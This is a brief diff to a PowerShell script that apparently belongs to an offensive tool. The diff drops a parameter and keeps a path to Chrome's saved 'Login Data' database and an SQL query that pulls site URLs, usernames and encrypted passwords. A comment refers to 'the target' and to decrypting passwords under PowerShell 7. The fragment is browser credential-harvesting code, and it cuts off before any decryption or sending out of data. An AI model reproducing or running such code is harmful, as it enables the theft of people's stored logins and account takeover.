@@ -1,8 +1,4 @@
-param (
-    [string]$dc
-)
- 
- $dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
+$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
 $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
 
 # If the target has PowerShell 7.x installed, passwords created in Chrome
